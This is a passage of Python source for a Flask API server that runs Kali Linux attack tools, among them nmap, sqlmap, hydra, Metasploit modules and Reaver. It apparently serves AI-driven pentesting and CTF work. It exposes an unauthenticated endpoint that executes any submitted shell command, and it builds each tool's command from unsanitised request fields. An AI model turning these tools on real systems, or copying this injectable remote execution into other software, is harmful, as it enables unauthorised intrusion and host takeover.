                result = self._call_gobuster(task.parameters)
            elif task.tool_name == "nikto":
                result = self._call_nikto(task.parameters)
            elif task.tool_name == "nuclei":
                result = self._call_nuclei(task.parameters)
            elif task.tool_name == "whatweb":
                result = self._call_whatweb(task.parameters)
            elif task.tool_name == "masscan":
                result = self._call_masscan(task.parameters)
            elif task.tool_name == "subfinder":
                result = self._call_subfinder(task.parameters)
            else:
                # 通用工具执行
                result = self._call_generic_tool(task.tool_name, task.parameters)
            
            end_time = datetime.now()
            execution_time = (end_time - start_time).total_seconds()

            status = TaskStatus.COMPLETED if result.get("success", False) else TaskStatus.FAILED

            # CTF模式下自动检测Flag
            if self.ctf_mode and result.get("success", False):
                output_text = str(result.get("output", ""))
                challenge_name = task.metadata.get("challenge_name", "")

                # 检测Flag
                flags = self.ctf_manager.process_tool_output(task.tool_name, output_text, challenge_name)

                if flags:
                    logger.info(f"🎯 发现 {len(flags)} 个潜在Flag: {[f.content for f in flags]}")
                    # 将Flag信息添加到结果中
                    if "flags" not in result:
                        result["flags"] = []
                    result["flags"].extend([{
                        "content": f.content,
                        "format": f.format_type,
                        "confidence": f.confidence,
                        "source": f.source
                    } for f in flags])

            return TaskResult(
                task_id=task.task_id,
                status=status,
                output=result,
                error=result.get("error") if not result.get("success") else None,
                start_time=start_time,
                end_time=end_time,
                execution_time=execution_time,
                partial_results=result.get("partial_results", False)
            )
            
        except Exception as e:
            end_time = datetime.now()
            execution_time = (end_time - start_time).total_seconds()
            
            logger.error(f"Task {task.task_id} failed: {str(e)}")
            
            return TaskResult(
                task_id=task.task_id,
                status=TaskStatus.FAILED,
                output={},
                error=str(e),
                start_time=start_time,
                end_time=end_time,
                execution_time=execution_time
            )
    
    def _call_nmap(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用nmap工具"""
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sV")
        ports = params.get("ports", "")
        additional_args = params.get("additional_args", "-T4 -Pn")
        
        command = f"nmap {scan_type}"
        if ports:
            command += f" -p {ports}"
        if additional_args:
            command += f" {additional_args}"
        command += f" {target}"
        
        return execute_command(command)
    
    def _call_gobuster(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用gobuster工具"""
        url = params.get("url", "")
        mode = params.get("mode", "dir")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")
        
        command = f"gobuster {mode} -u {url} -w {wordlist}"
        if additional_args:
            command += f" {additional_args}"
        
        return execute_command(command)
    
    def _call_nikto(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用nikto工具"""
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")
        
        command = f"nikto -h {target}"
        if additional_args:
            command += f" {additional_args}"
        
        return execute_command(command)
    
    def _call_nuclei(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用nuclei工具"""
        target = params.get("target", "")
        templates = params.get("templates", "")
        severity = params.get("severity", "critical,high,medium")
        additional_args = params.get("additional_args", "")
        
        command = f"nuclei -u {target}"
        if templates:
            command += f" -t {templates}"
        if severity:
            command += f" -severity {severity}"
        command += " -json -silent"
        if additional_args:
            command += f" {additional_args}"
        
        return execute_command(command)
    
    def _call_whatweb(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用whatweb工具"""
        target = params.get("target", "")
        aggression = params.get("aggression", "1")
        additional_args = params.get("additional_args", "")
        
        command = f"whatweb -a {aggression} --log-json=/dev/stdout {target}"
        if additional_args:
            command += f" {additional_args}"
        
        return execute_command(command)
    
    def _call_masscan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用masscan工具"""
        target = params.get("target", "")
        ports = params.get("ports", "80,443")
        rate = params.get("rate", "1000")
        additional_args = params.get("additional_args", "")
        
        command = f"masscan {target} -p{ports} --rate={rate}"
        if additional_args:
            command += f" {additional_args}"
        
        return execute_command(command)
    
    def _call_subfinder(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """调用subfinder工具"""
        domain = params.get("domain", "")
        additional_args = params.get("additional_args", "")
        
        command = f"subfinder -d {domain} -o /dev/stdout -oJ"
        if additional_args:
            command += f" {additional_args}"
        
        return execute_command(command)
    
    def _call_generic_tool(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """通用工具调用"""
        command = tool_name
        
        if "target" in params:
            command += f" {params['target']}"
        if "additional_args" in params:
            command += f" {params['additional_args']}"
        
        return execute_command(command)
    
    def _on_task_completed(self, task: ConcurrentTask, future: Future):
        """任务完成回调"""
        try:
            result = future.result()
            
            with self._lock:
                self._task_results[task.task_id] = result
                self._stats["running_tasks"] -= 1
                
                if result.status == TaskStatus.COMPLETED:
                    self._stats["completed_tasks"] += 1
                elif result.status == TaskStatus.FAILED:
                    self._stats["failed_tasks"] += 1
            
            # 检查依赖任务
            ready_dependents = self._get_ready_dependents(task.task_id)
            for dependent_id in ready_dependents:
                dependent_task = self._tasks.get(dependent_id)
                if dependent_task:
                    self._task_queues[dependent_task.priority].put(dependent_task)
                    logger.info(f"Task {dependent_id} dependencies satisfied, queued for execution")
            
            # 更新工作流状态
            self._update_workflow_status(task.task_id, result)
            
            logger.info(f"Task {task.task_id} completed with status: {result.status.value}")
            
        except Exception as e:
            logger.error(f"Error in task completion callback: {str(e)}")
            with self._lock:
                self._stats["running_tasks"] -= 1
                self._stats["failed_tasks"] += 1
    
    def _check_dependencies_satisfied(self, task_id: str) -> bool:
        """检查任务依赖是否满足"""
        dependencies = self._dependencies.get(task_id, [])
        
        for dep in dependencies:
            dep_result = self._task_results.get(dep.task_id)
            if not dep_result or dep_result.status != TaskStatus.COMPLETED:
                return False
        
        return True
    
    def _get_ready_dependents(self, completed_task_id: str) -> List[str]:
        """获取因任务完成而变为可执行的依赖任务"""
        ready_tasks = []
        dependents = self._dependents.get(completed_task_id, set())
        
        for dependent_id in dependents:
            if self._check_dependencies_satisfied(dependent_id):
                ready_tasks.append(dependent_id)
        
        return ready_tasks
    
    def _update_workflow_status(self, task_id: str, result: TaskResult):
        """更新工作流状态"""
        with self._lock:
            for workflow_id, workflow_state in self._workflows.items():
                if task_id in workflow_state.get("task_ids", []):
                    # 初始化计数器（如果不存在）
                    if "completed_tasks" not in workflow_state:
                        workflow_state["completed_tasks"] = 0
                    if "total_tasks" not in workflow_state:
                        workflow_state["total_tasks"] = len(workflow_state.get("task_ids", []))

                    if result.status == TaskStatus.COMPLETED:
                        workflow_state["completed_tasks"] += 1

                    # 检查工作流是否完成
                    if workflow_state["completed_tasks"] >= workflow_state["total_tasks"]:
                        workflow_state["status"] = "completed"
                        workflow_state["completed_at"] = datetime.now()
                        logger.info(f"Workflow {workflow_id} completed")

                    break
    
    def get_task_status(self, task_id: str) -> Optional[Dict[str, Any]]:
        """获取任务状态"""
        with self._lock:
            task = self._tasks.get(task_id)
            result = self._task_results.get(task_id)
            
            if not task:
                return None
            
            status_info = {
                "task_id": task_id,
                "tool_name": task.tool_name,
                "parameters": task.parameters,
                "priority": task.priority.value,
                "created_at": task.created_at.isoformat(),
                "tags": list(task.tags),
                "metadata": task.metadata
            }
            
            if result:
                status_info.update({
                    "status": result.status.value,
                    "start_time": result.start_time.isoformat() if result.start_time else None,
                    "end_time": result.end_time.isoformat() if result.end_time else None,
                    "execution_time": result.execution_time,
                    "error": result.error,
                    "partial_results": result.partial_results,
                    "output": result.output
                })
            else:
                if self._check_dependencies_satisfied(task_id):
                    status_info["status"] = TaskStatus.PENDING.value
                else:
                    status_info["status"] = TaskStatus.WAITING_DEPS.value
            
            return status_info
    
    def get_workflow_status(self, workflow_id: str) -> Optional[Dict[str, Any]]:
        """获取工作流状态"""
        with self._lock:
            workflow = self._workflows.get(workflow_id)
            if not workflow:
                return None
            
            # 获取所有任务的详细状态
            task_statuses = []
            for task_id in workflow.get("task_ids", []):
                task_status = self.get_task_status(task_id)
                if task_status:
                    task_statuses.append(task_status)
            
            result = {
                **workflow,
                "created_at": workflow["created_at"].isoformat(),
                "task_details": task_statuses
            }
            
            if "completed_at" in workflow:
                result["completed_at"] = workflow["completed_at"].isoformat()
            
            return result
    
    def get_system_stats(self) -> Dict[str, Any]:
        """获取系统统计信息"""
        with self._lock:
            return {
                **self._stats,
                "max_workers": self.max_workers,
                "total_workflows": len(self._workflows),
                "queue_sizes": {
                    "urgent": self._task_queues[TaskPriority.URGENT].qsize(),
                    "high": self._task_queues[TaskPriority.HIGH].qsize(),
                    "normal": self._task_queues[TaskPriority.NORMAL].qsize(),
                    "low": self._task_queues[TaskPriority.LOW].qsize()
                }
            }

# 创建全局任务管理器实例（将在main函数中初始化）

class CommandExecutor:
    """Class to handle command execution with better timeout management"""
    
    def __init__(self, command: str, timeout: int = COMMAND_TIMEOUT):
        self.command = command
        self.timeout = timeout
        self.process = None
        self.stdout_data = ""
        self.stderr_data = ""
        self.stdout_thread = None
        self.stderr_thread = None
        self.return_code = None
        self.timed_out = False
    
    def _read_stdout(self):
        """Thread function to continuously read stdout"""
        for line in iter(self.process.stdout.readline, ''):
            self.stdout_data += line
    
    def _read_stderr(self):
        """Thread function to continuously read stderr"""
        for line in iter(self.process.stderr.readline, ''):
            self.stderr_data += line
    
    def execute(self) -> Dict[str, Any]:
        """Execute the command and handle timeout gracefully"""
        logger.info(f"Executing command: {self.command}")
        
        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1  # Line buffered
            )
            
            # Start threads to read output continuously
            self.stdout_thread = threading.Thread(target=self._read_stdout)
            self.stderr_thread = threading.Thread(target=self._read_stderr)
            self.stdout_thread.daemon = True
            self.stderr_thread.daemon = True
            self.stdout_thread.start()
            self.stderr_thread.start()
            
            # Wait for the process to complete or timeout
            try:
                self.return_code = self.process.wait(timeout=self.timeout)
                # Process completed, join the threads
                self.stdout_thread.join()
                self.stderr_thread.join()
            except subprocess.TimeoutExpired:
                # Process timed out but we might have partial results
                self.timed_out = True
                logger.warning(f"Command timed out after {self.timeout} seconds. Terminating process.")
                
                # Try to terminate gracefully first
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)  # Give it 5 seconds to terminate
                except subprocess.TimeoutExpired:
                    # Force kill if it doesn't terminate
                    logger.warning("Process not responding to termination. Killing.")
                    self.process.kill()
                
                # Update final output
                self.return_code = -1
            
            # Always consider it a success if we have output, even with timeout
            success = True if self.timed_out and (self.stdout_data or self.stderr_data) else (self.return_code == 0)
            
            return {
                "stdout": self.stdout_data,
                "stderr": self.stderr_data,
                "return_code": self.return_code,
                "success": success,
                "timed_out": self.timed_out,
                "partial_results": self.timed_out and (self.stdout_data or self.stderr_data)
            }
        
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            logger.error(traceback.format_exc())
            return {
                "stdout": self.stdout_data,
                "stderr": f"Error executing command: {str(e)}\n{self.stderr_data}",
                "return_code": -1,
                "success": False,
                "timed_out": False,
                "partial_results": bool(self.stdout_data or self.stderr_data)
            }


def execute_command(command: str) -> Dict[str, Any]:
    """
    Execute a shell command and return the result
    
    Args:
        command: The command to execute
        
    Returns:
        A dictionary containing the stdout, stderr, and return code
    """
    executor = CommandExecutor(command)
    return executor.execute()


@app.route("/api/command", methods=["POST"])
def generic_command():
    """Execute any command provided in the request."""
    try:
        params = request.json
        command = params.get("command", "")
        
        if not command:
            logger.warning("Command endpoint called without command parameter")
            return jsonify({
                "error": "Command parameter is required"
            }), 400
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in command endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500


@app.route("/api/tools/nmap", methods=["POST"])
def nmap():
    """Execute nmap scan with the provided parameters."""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sCV")
        ports = params.get("ports", "")
        additional_args = params.get("additional_args", "-T4 -Pn")

        # 智能参数优化
        use_intelligent_params = params.get("intelligent_optimization", True)
        target_type = params.get("target_type", "unknown")
        time_constraint = params.get("time_constraint", "quick")
        stealth_mode = params.get("stealth_mode", False)

        if not target:
            logger.warning("Nmap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        # 如果启用智能优化且模块已初始化
        if use_intelligent_params and 'parameter_optimizer' in globals():
            try:
                # 分析目标类型（如果未指定）
                if target_type == "unknown":
                    target_type = parameter_optimizer._analyze_target_type(target, {})

                # 获取优化参数
                optimal_params = parameter_optimizer.get_optimal_params(
                    tool="nmap",
                    target_type=target_type,
                    time_constraint=time_constraint,
                    stealth_mode=stealth_mode
                )

                # 合并优化参数
                if optimal_params.get("scan_type"):
                    scan_type = optimal_params["scan_type"]
                if optimal_params.get("additional_args"):
                    additional_args = optimal_params["additional_args"]
                if optimal_params.get("ports") and not ports:
                    ports = optimal_params["ports"]

                logger.info(f"Applied intelligent optimization for nmap: {optimal_params}")
            except Exception as e:
                logger.warning(f"Failed to apply intelligent optimization: {e}")

        command = f"nmap {scan_type}"

        if ports:
            command += f" -p {ports}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {target}"

        result = execute_command(command)

        # 如果启用智能分析，添加额外的分析信息
        if use_intelligent_params and result.get("success"):
            result["intelligent_analysis"] = {
                "target_type": target_type,
                "optimization_applied": True,
                "recommended_follow_up": parameter_optimizer._get_attack_vectors_for_service("network")
            }

        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in nmap endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/gobuster", methods=["POST"])
def gobuster():
    """Execute gobuster with the provided parameters."""
    try:
        params = request.json
        url = params.get("url", "")
        mode = params.get("mode", "dir")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")

        # 智能参数优化
        use_intelligent_params = params.get("intelligent_optimization", True)
        target_type = params.get("target_type", "web")
        time_constraint = params.get("time_constraint", "quick")
        stealth_mode = params.get("stealth_mode", False)

        if not url:
            logger.warning("Gobuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        # Validate mode
        if mode not in ["dir", "dns", "fuzz", "vhost"]:
            logger.warning(f"Invalid gobuster mode: {mode}")
            return jsonify({
                "error": f"Invalid mode: {mode}. Must be one of: dir, dns, fuzz, vhost"
            }), 400

        # 如果启用智能优化且模块已初始化
        if use_intelligent_params and 'parameter_optimizer' in globals():
            try:
                # 获取优化参数
                optimal_params = parameter_optimizer.get_optimal_params(
                    tool="gobuster",
                    target_type=target_type,
                    time_constraint=time_constraint,
                    stealth_mode=stealth_mode
                )

                # 合并优化参数
                if optimal_params.get("wordlist") and wordlist == "/usr/share/wordlists/dirb/common.txt":
                    wordlist = optimal_params["wordlist"]
                if optimal_params.get("additional_args"):
                    if additional_args:
                        additional_args += f" {optimal_params['additional_args']}"
                    else:
                        additional_args = optimal_params["additional_args"]

                logger.info(f"Applied intelligent optimization for gobuster: {optimal_params}")
            except Exception as e:
                logger.warning(f"Failed to apply intelligent optimization: {e}")

        command = f"gobuster {mode} -u {url} -w {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        result = execute_command(command)

        # 如果启用智能分析，添加额外的分析信息
        if use_intelligent_params and result.get("success"):
            result["intelligent_analysis"] = {
                "target_type": target_type,
                "optimization_applied": True,
                "recommended_follow_up": parameter_optimizer._get_attack_vectors_for_service("web")
            }

        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in gobuster endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dirb", methods=["POST"])
def dirb():
    """Execute dirb with the provided parameters."""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("Dirb called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"dirb {url} {wordlist}"
        
        if additional_args:
            command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in dirb endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nikto", methods=["POST"])
def nikto():
    """Execute nikto with the provided parameters."""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("Nikto called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"nikto -h {target}"
        
        if additional_args:
            command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in nikto endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/sqlmap", methods=["POST"])
def sqlmap():
    """Execute sqlmap with the provided parameters."""
    try:
        params = request.json
        url = params.get("url", "")
        data = params.get("data", "")
        additional_args = params.get("additional_args", "")

        # 智能参数优化
        use_intelligent_params = params.get("intelligent_optimization", True)
        target_type = params.get("target_type", "web")
        time_constraint = params.get("time_constraint", "quick")
        stealth_mode = params.get("stealth_mode", False)

        if not url:
            logger.warning("SQLMap called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        # 如果启用智能优化且模块已初始化
        if use_intelligent_params and 'parameter_optimizer' in globals():
            try:
                # 获取优化参数
                optimal_params = parameter_optimizer.get_optimal_params(
                    tool="sqlmap",
                    target_type=target_type,
                    time_constraint=time_constraint,
                    stealth_mode=stealth_mode
                )

                # 合并优化参数
                if optimal_params.get("additional_args"):
                    if additional_args:
                        additional_args += f" {optimal_params['additional_args']}"
                    else:
                        additional_args = optimal_params["additional_args"]

                logger.info(f"Applied intelligent optimization for sqlmap: {optimal_params}")
            except Exception as e:
                logger.warning(f"Failed to apply intelligent optimization: {e}")

        command = f"sqlmap -u {url} --batch"

        if data:
            command += f" --data=\"{data}\""

        if additional_args:
            command += f" {additional_args}"

        result = execute_command(command)

        # 如果启用智能分析，添加额外的分析信息
        if use_intelligent_params and result.get("success"):
            result["intelligent_analysis"] = {
                "target_type": target_type,
                "optimization_applied": True,
                "recommended_follow_up": parameter_optimizer._get_attack_vectors_for_service("database")
            }

        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in sqlmap endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/metasploit", methods=["POST"])
def metasploit():
    """Execute metasploit module with the provided parameters."""
    try:
        params = request.json
        module = params.get("module", "")
        options = params.get("options", {})
        
        if not module:
            logger.warning("Metasploit called without module parameter")
            return jsonify({
                "error": "Module parameter is required"
            }), 400
        
        # Format options for Metasploit
        options_str = ""
        for key, value in options.items():
            options_str += f" {key}={value}"
        
        # Create an MSF resource script
        resource_content = f"use {module}\n"
        for key, value in options.items():
            resource_content += f"set {key} {value}\n"
        resource_content += "exploit\n"
        
        # Save resource script to a temporary file
        resource_file = "/tmp/mcp_msf_resource.rc"
        with open(resource_file, "w") as f:
            f.write(resource_content)
        
        command = f"msfconsole -q -r {resource_file}"
        result = execute_command(command)
        
        # Clean up the temporary file
        try:
            os.remove(resource_file)
        except Exception as e:
            logger.warning(f"Error removing temporary resource file: {str(e)}")
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in metasploit endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hydra", methods=["POST"])
def hydra():
    """Execute hydra with the provided parameters."""
    try:
        params = request.json
        # 应用智能优化
        params = apply_intelligent_optimization("hydra", params)

        target = params.get("target", "")
        service = params.get("service", "")
        username = params.get("username", "")
        username_file = params.get("username_file", "")
        password = params.get("password", "")
        password_file = params.get("password_file", "")
        additional_args = params.get("additional_args", "")

        if not target or not service:
            logger.warning("Hydra called without target or service parameter")
            return jsonify({
                "error": "Target and service parameters are required"
            }), 400

        if not (username or username_file) or not (password or password_file):
            logger.warning("Hydra called without username/password parameters")
            return jsonify({
                "error": "Username/username_file and password/password_file are required"
            }), 400

        command = f"hydra -t 4"

        if username:
            command += f" -l {username}"
        elif username_file:
            command += f" -L {username_file}"

        if password:
            command += f" -p {password}"
        elif password_file:
            command += f" -P {password_file}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {target} {service}"

        result = execute_command(command)

        # 添加智能分析
        result = add_intelligent_analysis_to_result("hydra", target, result, params)

        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in hydra endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/john", methods=["POST"])
def john():
    """Execute john with the provided parameters."""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        format_type = params.get("format", "")
        additional_args = params.get("additional_args", "")
        
        if not hash_file:
            logger.warning("John called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400
        
        command = f"john"
        
        if format_type:
            command += f" --format={format_type}"
        
        if wordlist:
            command += f" --wordlist={wordlist}"
        
        if additional_args:
            command += f" {additional_args}"
        
        command += f" {hash_file}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in john endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# Removed duplicate wpscan route - using the more complete version below

@app.route("/api/tools/enum4linux", methods=["POST"])
def enum4linux():
    """Execute enum4linux with the provided parameters."""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "-a")

        if not target:
            logger.warning("Enum4linux called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"enum4linux {additional_args} {target}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in enum4linux endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nuclei", methods=["POST"])
def nuclei():
    """Execute Nuclei vulnerability scanner with the provided parameters."""
    try:
        params = request.json
        target = params.get("target", "")
        templates = params.get("templates", "")
        severity = params.get("severity", "critical,high,medium")
        tags = params.get("tags", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("Nuclei called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        # 构建nuclei命令
        command = f"nuclei -u {target}"

        # 添加模板过滤
        if templates:
            command += f" -t {templates}"

        # 添加严重程度过滤
        if severity:
            command += f" -severity {severity}"

        # 添加标签过滤
        if tags:
            command += f" -tags {tags}"

        # 设置输出格式
        if output_format == "json":
            command += " -json"

        # 添加静默模式和优化参数
        command += " -silent -rate-limit 100 -timeout 10"

        # 添加额外参数
        if additional_args:
            command += f" {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in nuclei endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# Quick health check endpoint (without tool verification)
@app.route("/health/quick", methods=["GET"])
def quick_health_check():
    """Quick health check endpoint without tool verification."""
    return jsonify({
        "status": "healthy",
        "message": "Kali Linux Tools API Server is running",
        "quick_check": True,
        "note": "Use /health for full tool verification"
    })

# Health check endpoint
@app.route("/health", methods=["GET"])
def health_check():
    """Health check endpoint."""
    # Check if essential tools are installed
    essential_tools = [
        # 核心扫描工具
        "nmap", "masscan", "zmap", "rustscan",
        # 目录和子域名扫描
        "gobuster", "dirb", "dirbuster", "ffuf", "sublist3r", "subfinder", "amass",
        # DNS枚举
        "dnsrecon", "dnsenum", "fierce", "dnsmap",
        # Web漏洞扫描
        "nikto", "nuclei", "wpscan", "joomscan", "droopescan",
        # 模糊测试
        "wfuzz", "feroxbuster",
        # WAF检测
        "wafw00f",
        # SQL注入
        "sqlmap",
        # 密码攻击
        "hydra", "john", "hashcat", "medusa", "ncrack", "patator", "crowbar", "brutespray",
        # 网络发现
        "netdiscover", "arp-scan", "fping",
        # 无线安全
        "reaver", "bully", "pixiewps", "wifiphisher",
        # 蓝牙工具
        "bluesnarfer", "btscanner",
        # 网络攻击
        "bettercap", "ettercap", "responder", "dsniff", "ngrep", "tshark",
        # DoS工具
        "slowhttptest", "t50",
        # 后渗透
        "armitage", "linpeas", "linenum", "pspy",
        # 固件分析
        "binwalk", "sasquatch",
        # 社会工程学
        "set", "yersinia", "villain",
        # 信息收集
        "theharvester", "recon-ng", "sherlock", "whatweb"
    ]
    tools_status = {}

    for tool in essential_tools:
        try:
            result = execute_command(f"which {tool}")
            tools_status[tool] = result["success"]
        except:
            tools_status[tool] = False

    # 特别检查nuclei版本和模板
    nuclei_details = {}
    if tools_status.get("nuclei", False):
        try:
            version_result = execute_command("nuclei -version")
            if version_result["success"]:
                nuclei_details["version"] = version_result["stdout"].strip()

            # 检查模板数量
            templates_result = execute_command("nuclei -tl | wc -l")
            if templates_result["success"]:
                template_count = templates_result["stdout"].strip()
                nuclei_details["template_count"] = template_count

            # 检查模板更新状态
            stats_result = execute_command("nuclei -stats")
            if stats_result["success"]:
                nuclei_details["stats"] = stats_result["stdout"]
        except:
            nuclei_details["error"] = "Failed to get nuclei details"

    all_essential_tools_available = all(tools_status.values())

    return jsonify({
        "status": "healthy",
        "message": "Kali Linux Tools API Server is running",
        "tools_status": tools_status,
        "nuclei_details": nuclei_details,
        "all_essential_tools_available": all_essential_tools_available
    })

@app.route("/api/tools/wfuzz", methods=["POST"])
def wfuzz():
    """Execute Wfuzz web fuzzer with the provided parameters."""
    try:
        params = request.json
        target = params.get("target", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "-c")

        if not target:
            logger.warning("Wfuzz called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"wfuzz {additional_args} -w {wordlist} {target}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in wfuzz endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wafw00f", methods=["POST"])
def wafw00f():
    """Execute wafw00f WAF detection with the provided parameters."""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "-a")

        if not target:
            logger.warning("wafw00f called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"wafw00f {additional_args} {target}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in wafw00f endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/sublist3r", methods=["POST"])
def sublist3r():
    """Execute Sublist3r subdomain enumeration with the provided parameters."""
    try:
        params = request.json
        domain = params.get("domain", "")
        additional_args = params.get("additional_args", "-v")

        if not domain:
            logger.warning("Sublist3r called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"sublist3r -d {domain} {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in sublist3r endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/masscan", methods=["POST"])
def masscan():
    """Execute Masscan high-speed port scanner."""
    try:
        params = request.json
        target = params.get("target", "")
        ports = params.get("ports", "80,443")
        rate = params.get("rate", "1000")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"masscan {target} -p{ports} --rate={rate} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in masscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/dnsrecon", methods=["POST"])
def dnsrecon():
    """Execute DNSrecon for DNS enumeration."""
    try:
        params = request.json
        domain = params.get("domain", "")
        scan_type = params.get("scan_type", "-t std")
        additional_args = params.get("additional_args", "")

        if not domain:
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"dnsrecon -d {domain} {scan_type} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in dnsrecon endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/wpscan", methods=["POST"])
def wpscan():
    """Execute WPScan for WordPress security testing."""
    try:
        params = request.json
        target = params.get("target", "")
        api_token = params.get("api_token", "")
        additional_args = params.get("additional_args", "--enumerate p,t,u")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"wpscan --url {target}"
        if api_token:
            command += f" --api-token {api_token}"
        command += f" {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in wpscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/reaver", methods=["POST"])
def reaver():
    """Execute Reaver for WPS attacks."""
    try:
        params = request.json
        interface = params.get("interface", "")
        bssid = params.get("bssid", "")
        additional_args = params.get("additional_args", "-vv")

        if not interface or not bssid:
            return jsonify({"error": "Interface and BSSID parameters are required"}), 400

        command = f"reaver -i {interface} -b {bssid} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in reaver endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/bettercap", methods=["POST"])
def bettercap():
